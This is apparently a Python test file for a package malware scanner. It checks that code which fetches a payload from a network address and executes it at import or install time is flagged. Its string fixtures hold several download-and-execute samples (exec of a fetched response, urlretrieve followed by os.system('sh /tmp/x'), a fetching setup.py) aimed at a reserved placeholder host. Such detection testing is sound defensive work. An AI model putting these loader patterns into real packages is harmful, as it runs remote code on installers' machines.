"""Code fetched from the network and run when a package is imported (`flows/implants/fetch_run_at_load.py`).

Every source is assembled for the test and only parsed or scanned; the addresses are reserved names."""

from __future__ import annotations

import io
import tarfile
from typing import TYPE_CHECKING

from cordon_scanner import Scanner
from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.foundation.config.settings import Config

if TYPE_CHECKING:
    from pathlib import Path

URL = "https://example.invalid/stage"


class FetchRunKit:
    DETAIL = "fetch and run at load"
    RULE = "MALWARE.IMPORT.FETCH_RUN.001"

    @staticmethod
    def details(source: str) -> list[str]:
        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail == FetchRunKit.DETAIL]

    @staticmethod
    def rules(tmp_path: Path, init: str, name: str = "__init__.py") -> set[str]:
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for member, text in (
                ("PKG-INFO", "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n"),
                ("setup.py", "from setuptools import setup\nsetup(name='demo', version='1.0')\n"),
                (f"demo/{name}", init),
            ):
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{member}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}


class TestFetchedAndRunAtLoad:
    def test_a_response_executed_at_module_level(self) -> None:
        source = (
            f"import urllib.request\ncode = urllib.request.urlopen('{URL}').read()\nexec(code)\n"
        )
        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]

    def test_a_download_then_a_process_in_a_helper_the_module_calls(self) -> None:
        source = (
            "import requests, subprocess, tempfile\n"
            "def _boot():\n"
            f"    data = requests.get('{URL}').content\n"
            "    path = tempfile.mktemp()\n"
            "    open(path, 'wb').write(data)\n"
            "    subprocess.Popen([path])\n"
            "_boot()\n"
        )
        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]

    def test_a_fetch_and_a_shell_command_in_a_thread_started_at_load(self) -> None:
        source = (
            "import os, threading, urllib.request\n"
            "def _work():\n"
            f"    urllib.request.urlretrieve('{URL}', '/tmp/x')\n"
            "    os.system('sh /tmp/x')\n"
            "threading.Thread(target=_work).start()\n"
        )
        assert FetchRunKit.details(source) == [FetchRunKit.DETAIL]


class TestNotThis:
    def test_a_fetch_alone_at_load(self) -> None:
        # A version check or a telemetry ping: nothing it gets is run.
        source = f"import requests\nLATEST = requests.get('{URL}').json()\n"
        assert FetchRunKit.details(source) == []

    def test_a_run_alone_at_load(self) -> None:
        source = "import subprocess\nsubprocess.run(['nvidia-smi'], capture_output=True)\n"
        assert FetchRunKit.details(source) == []

    def test_both_in_a_function_nothing_calls(self) -> None:
        source = f"import requests\ndef update():\n    exec(requests.get('{URL}').text)\n"
        assert FetchRunKit.details(source) == []

    def test_both_under_the_main_guard(self) -> None:
        source = (
            f"import requests\nif __name__ == '__main__':\n    exec(requests.get('{URL}').text)\n"
        )
        assert FetchRunKit.details(source) == []

    def test_a_fetch_beside_a_version_control_query(self) -> None:
        # Asking the machine's own tools something is not running what was fetched.
        source = (
            "import subprocess, requests\n"
            "REV = subprocess.check_output(['git', 'rev-parse', 'HEAD'])\n"
            f"LATEST = requests.get('{URL}').json()\n"
        )
        assert FetchRunKit.details(source) == []

    def test_an_exec_of_a_literal_beside_a_fetch(self) -> None:
        source = f"import requests\nexec('X = 1')\nLATEST = requests.get('{URL}').json()\n"
        assert FetchRunKit.details(source) == []


class TestTheRule:
    def test_importing_the_package_blocks(self, tmp_path: Path) -> None:
        init = f"import urllib.request\nexec(urllib.request.urlopen('{URL}').read())\n"
        assert FetchRunKit.RULE in FetchRunKit.rules(tmp_path, init)

    def test_the_same_in_a_test_file_is_not_reported(self, tmp_path: Path) -> None:
        init = f"import urllib.request\nexec(urllib.request.urlopen('{URL}').read())\n"
        assert FetchRunKit.RULE not in FetchRunKit.rules(tmp_path, init, name="test_boot.py")


class TestTheInstallForm:
    INSTALL_RULE = "MALWARE.INSTALL.FETCH_RUN.001"

    @staticmethod
    def rules(tmp_path: Path, setup: str) -> set[str]:
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for member, text in (
                ("PKG-INFO", "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n"),
                ("setup.py", setup),
                ("demo/__init__.py", "VERSION = '1.0'\n"),
            ):
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{member}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_a_setup_script_that_fetches_and_runs_blocks(self, tmp_path: Path) -> None:
        setup = (
            "import os, urllib.request\n"
            "from setuptools import setup\n"
            f"urllib.request.urlretrieve('{URL}', '/tmp/s')\n"
            "os.system('sh /tmp/s')\n"
            "setup(name='demo', version='1.0')\n"
        )
        assert self.INSTALL_RULE in self.rules(tmp_path, setup)

    def test_a_setup_script_that_only_reads_a_version_is_not_this(self, tmp_path: Path) -> None:
        setup = (
            "import subprocess\n"
            "from setuptools import setup\n"
            "rev = subprocess.check_output(['git', 'describe']).decode()\n"
            "setup(name='demo', version='1.0')\n"
        )
        assert self.INSTALL_RULE not in self.rules(tmp_path, setup)
